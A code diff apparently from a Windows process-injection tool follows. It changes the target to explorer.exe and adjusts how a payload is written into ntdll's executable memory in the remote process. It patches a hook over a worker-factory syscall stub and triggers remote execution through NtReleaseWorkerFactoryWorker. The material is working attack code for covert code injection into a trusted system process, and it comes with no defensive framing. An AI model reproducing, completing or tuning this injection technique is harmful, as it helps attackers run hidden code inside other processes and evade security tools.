@@ -1,9 +1,13 @@
 #include "global.h"
 
-#define TARGET_PROCESS_NAME L"iexplore.exe"
+#define TARGET_PROCESS_NAME L"explorer.exe"
 #define NT_SYSCALL_START 0x0	///System call numbers always started with 0.
 #define NT_SYSCALL_END 0x1000	///0x1000 is the begin of win32k system calls and hence, the last possible NT syscall is 0xFFF.
-
+#define REL_JUMP_SIZE 5
+#define RT_SECTION_SIZE PAGE_SIZE
+#define RT_SECTION_RESERVED_BYTES 1024
+#define NTDLL_TEXT_OFFSET PAGE_SIZE
+#define NTDLL_TEXT_SIZE_WIN10 (1024 * 1008)
 #define WORKER_FACTORY_ALL_ACCESS 0xF00FF
 
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
@@ -23,32 +27,32 @@ typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
 	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
 } SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;
 
-typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
-	LARGE_INTEGER Timeout;
-	LARGE_INTEGER RetryTimeout;
-	LARGE_INTEGER IdleTimeout;
-	BOOLEAN Paused;
-	BOOLEAN TimerSet;
-	BOOLEAN QueuedToExWorker;
-	BOOLEAN MayCreate;
-	BOOLEAN CreateInProgress;
-	BOOLEAN InsertedIntoQueue;
-	BOOLEAN Shutdown;
-	ULONG BindingCount;
-	ULONG ThreadMinimum;
-	ULONG ThreadMaximum;
-	ULONG PendingWorkerCount;
-	ULONG WaitingWorkerCount;
-	ULONG TotalWorkerCount;
-	ULONG ReleaseCount;
-	LONGLONG InfiniteWaitGoal;
-	PVOID StartRoutine;
-	PVOID StartParameter;
-	HANDLE ProcessId;
-	SIZE_T StackReserve;
-	SIZE_T StackCommit;
-	NTSTATUS LastThreadCreationStatus;
-} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;
+//typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
+//	LARGE_INTEGER Timeout;
+//	LARGE_INTEGER RetryTimeout;
+//	LARGE_INTEGER IdleTimeout;
+//	BOOLEAN Paused;
+//	BOOLEAN TimerSet;
+//	BOOLEAN QueuedToExWorker;
+//	BOOLEAN MayCreate;
+//	BOOLEAN CreateInProgress;
+//	BOOLEAN InsertedIntoQueue;
+//	BOOLEAN Shutdown;
+//	ULONG BindingCount;
+//	ULONG ThreadMinimum;
+//	ULONG ThreadMaximum;
+//	ULONG PendingWorkerCount;
+//	ULONG WaitingWorkerCount;
+//	ULONG TotalWorkerCount;
+//	ULONG ReleaseCount;
+//	LONGLONG InfiniteWaitGoal;
+//	PVOID StartRoutine;
+//	PVOID StartParameter;
+//	HANDLE ProcessId;
+//	SIZE_T StackReserve;
+//	SIZE_T StackCommit;
+//	NTSTATUS LastThreadCreationStatus;
+//} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;
 ///We define a generic system call structure which held true ever since Windows NT 3.51.
 typedef struct _NT_SYSCALL_STUB {
 	BYTE movR64Rcx[3];
@@ -207,20 +211,25 @@ NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONGLO
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	ULONGLONG payloadAddress;
 	SIZE_T bytesToProtect = PAGE_SIZE;
-	NT_SYSCALL_STUB originalSyscallStub = *(PNT_SYSCALL_STUB)injectionHookAddress;
+	//NT_SYSCALL_STUB originalSyscallStub = *(PNT_SYSCALL_STUB)injectionHookAddress;
+	//ULONG_PTR originalSyscallStub = *(PULONG_PTR)injectionHookAddress;
 	ULONG callDisplacement;
-	unsigned char pReadBuffer[8];
+	//unsigned char pReadBuffer[8];
 	//signed someValue = 23;
-	//USHORT lineNum = 0;
+	USHORT lineNum = 0;
 	//HANDLE hHandle = hRemoteWorkerFactory;
+	//E8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00; (payloadAddress - injectionHookAddress - 5)
+	//90 90 90 90
+	//	XX XX XX XX XX XX XX XX E8 00 00 00 00 00 00 00  (payloadAddress - injectionHookAddress - 5)
+	//	XX XX XX XX XX XX XX XX XX XX 90 E8 00 00 00 00  (payloadAddress - injectionHookAddress -8)
 
 	interval.QuadPart = timeoutMilliseconds * (long long)(-10000);
 	do {
-		bytesToProtect = 1008 * 1024;
-		pNtdllRxBegin = (PVOID)(0x1000 + (ULONGLONG)((PLDR_DATA_TABLE_ENTRY)((PLDR_DATA_TABLE_ENTRY)NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink)->InLoadOrderLinks.Flink)->DllBase);
-		payloadAddress = (ULONGLONG)pNtdllRxBegin + bytesToProtect - 3 * 1024;
-		callDisplacement = (ULONG)(payloadAddress - injectionHookAddress - 5);
-		*(PULONG)((PUCHAR)&injectionCode + 1) = callDisplacement;
+		bytesToProtect = NTDLL_TEXT_SIZE_WIN10;	///<=== VERY bad. ntdll RX size is hardcoded!
+		pNtdllRxBegin = (PVOID)(NTDLL_TEXT_OFFSET + (ULONGLONG)((PLDR_DATA_TABLE_ENTRY)((PLDR_DATA_TABLE_ENTRY)NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink)->InLoadOrderLinks.Flink)->DllBase);
+		payloadAddress = (ULONGLONG)pNtdllRxBegin + bytesToProtect - RT_SECTION_SIZE + RT_SECTION_RESERVED_BYTES;	///Last 3 KB of RT section
+		callDisplacement = (ULONG)(payloadAddress - (injectionHookAddress + 3) - REL_JUMP_SIZE);	///3 is due to injectionHookAddress != jmp instruction address.
+		*(PULONG)((PUCHAR)&injectionCode + 4) = callDisplacement;
 		originalSyscallCode = *(PULONG_PTR)injectionHookAddress;
 		ntCreateThreadExNumber = ((PNT_SYSCALL_STUB)NtCreateThreadEx)->syscallNumber;
 		ntProtectVirtMemNumber = ((PNT_SYSCALL_STUB)NtProtectVirtualMemory)->syscallNumber;
@@ -239,67 +248,80 @@ NTSTATUS injectIntoProcess(HANDLE hProcess, HANDLE hRemoteWorkerFactory, ULONGLO
 		status = NtWriteVirtualMemory(hProcess, (PVOID)payloadAddress, &bootstrapRoutineBegin, (SIZE_T)&bootstrapRoutineEnd - (SIZE_T)&bootstrapRoutineBegin, &bytesWritten);
 		if (status)
 			break;
-
+		//injectionHookAddress += 0x0A;
+		//injectionCode = 0xFEEB;
 		NtSuspendProcess(hProcess);
 		status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG_PTR), &bytesWritten);
-		if (status) {
-			NtResumeProcess(hProcess);
-			break;
-		}
-		WORKER_FACTORY_BASIC_INFORMATION workerFactoryBasicInfo;
-		ULONG workerMinimum = 0;
-		ULONG workerMaximum = 0;
-		ULONG returnLen = 0;
-		status = NtQueryInformationWorkerFactory(hRemoteWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryBasicInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnLen);
 		if (status)
 			break;
+		//WORKER_FACTORY_BASIC_INFORMATION workerFactoryBasicInfo;
+		//ULONG workerMinimum = 0;
+		//ULONG workerMaximum = 0;
+		//ULONG returnLen = 0;
+		//status = NtQueryInformationWorkerFactory(hRemoteWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryBasicInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), &returnLen);
+		//if (status)
+		//	break;
 		//{
 		//	//myWPrintf(&lineNum, L"%d", returnLen);
 		//	NtRaiseHardError(status, 0, 0, NULL, 0, (PULONG)&status);
 		//}
-
-		workerMinimum = workerFactoryBasicInfo.TotalWorkerCount + 1;
-		if (workerFactoryBasicInfo.ThreadMaximum < workerMinimum) {
-			workerMaximum = workerMinimum + 1;
-			status = NtSetInformationWorkerFactory(hRemoteWorkerFactory, WorkerFactoryThreadMaximum, &workerMaximum, sizeof(ULONG));
-			if (status)
-				break;
-				//continue;	///This WorkerFactory is strange.
-		}
+		myWPrintf(&lineNum, L"%llx", ldrInitializeThunkAddr);
+		//workerMinimum = workerFactoryBasicInfo.TotalWorkerCount + 1;
+		//if (workerFactoryBasicInfo.ThreadMaximum < workerMinimum) {
+		//	workerMaximum = workerMinimum + 1;
+		//	status = NtSetInformationWorkerFactory(hRemoteWorkerFactory, WorkerFactoryThreadMaximum, &workerMaximum, sizeof(ULONG));
+		//	if (status)
+		//		break;
+		//		//continue;	///This WorkerFactory is strange.
+		//}
 		//NtSuspendProcess(hProcess);
 		//myWPrintf(&lineNum, L"Total count: %d", workerFactoryBasicInfo.TotalWorkerCount);
 		//myWPrintf(&lineNum, L"Worker maximum: %d", workerFactoryBasicInfo.ThreadMaximum);
 		//NtSuspendProcess(hProcess);
-		status = NtSetInformationWorkerFactory(hRemoteWorkerFactory, WorkerFactoryThreadMinimum, &workerMinimum, sizeof(ULONG));	///Finally trigger remote code execution.
-		//if (!status) {
-		//	flag = TRUE;
+		//status = NtSetInformationWorkerFactory(hRemoteWorkerFactory, WorkerFactoryThreadMinimum, &workerMinimum, sizeof(ULONG));	///Finally trigger remote code execution.
+		//status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
+		//if (status) {
+		////	flag = TRUE;
 		//	break;
 		//}
 		////NtResumeProcess(hProcess);
 		//if (status)
 		//	break;
+		//interval.QuadPart = -20000000;
+		
+		//NtDelayExecution(FALSE, &interval);
 
-		//NtReleaseWorkerFactoryWorker(hHandle);
-		NtDelayExecution(FALSE, &interval);
-
-		status = NtReadVirtualMemory(hProcess, (PVOID)injectionHookAddress, pReadBuffer, sizeof(pReadBuffer), &bytesWritten);
+		//status = NtReadVirtualMemory(hProcess, (PVOID)injectionHookAddress, pReadBuffer, sizeof(pReadBuffer), &bytesWritten);
+		status = NtReleaseWorkerFactoryWorker(hRemoteWorkerFactory);
 		if (status)
 			break;
 
-		if (mymemcmp(pReadBuffer, &injectionCode, sizeof(pReadBuffer))){
-			NtSuspendProcess(hProcess);
-			NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &originalSyscallStub, sizeof(NT_SYSCALL_STUB), &bytesWritten);
-			NtResumeProcess(hProcess);
+		//interval.QuadPart = -10000000;
 
-			//for (int i = 0; i < ((SIZE_T)&bootstrapRoutineEnd - (SIZE_T)&bootstrapRoutineBegin); i++)
-				//(&bootstrapRoutineBegin)[i] = 0x0;
-			NtWriteVirtualMemory(hProcess, (PVOID)payloadAddress, pZeroBuf, sizeof(pZeroBuf), &bytesWritten);
-			NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);
-			status = STATUS_UNSUCCESSFUL;
-			break;
-		}
+		//NtDelayExecution(FALSE, &interval);
+		interval.QuadPart = -100000;
+		NtDelayExecution(FALSE, &interval);
+		//injectionCode = 0xFEEB9090;
+		//NtSuspendProcess(hProcess);
+	//	status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG), &bytesWritten);		NtResumeProcess(hProcess);
+		//NtDelayExecution(FALSE, &interval);
+		//injectionCode = originalSyscallCode;
+		//NtSuspendProcess(hProcess);
+		//status = NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &injectionCode, sizeof(ULONG_PTR), &bytesWritten);
+		//if (mymemcmp(pReadBuffer, &injectionCode, sizeof(pReadBuffer))){
+		//	NtSuspendProcess(hProcess);
+		//	NtWriteVirtualMemory(hProcess, (PVOID)injectionHookAddress, &originalSyscallStub, sizeof(NT_SYSCALL_STUB), &bytesWritten);
+		//	NtResumeProcess(hProcess);
+
+		//	//for (int i = 0; i < ((SIZE_T)&bootstrapRoutineEnd - (SIZE_T)&bootstrapRoutineBegin); i++)
+		//		//(&bootstrapRoutineBegin)[i] = 0x0;
+		//	NtWriteVirtualMemory(hProcess, (PVOID)payloadAddress, pZeroBuf, sizeof(pZeroBuf), &bytesWritten);
+		//	NtProtectVirtualMemory(hProcess, &pNtdllRxBegin, &bytesToProtect, oldHookProtect, &oldHookProtect);
+		//	status = STATUS_UNSUCCESSFUL;
+		//	break;
+		//}
 	} while (status);
-
+	NtResumeProcess(hProcess);
 	//if (oldHookProtect)
 		
 
@@ -403,7 +425,7 @@ NTSTATUS openProcsByName(PHANDLE pProcess, PUNICODE_STRING pProcName, BOOLEAN us
 			if (status)
 				continue;
 
-			status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForWorkViaWorkerFactory, 150);
+			status = injectIntoProcess(hProcess, hWorkerFactory, (ULONGLONG)&NtWaitForWorkViaWorkerFactory + 8, 150);
 			if (!status) {
 				injectionSucceeded = TRUE;
 				break;
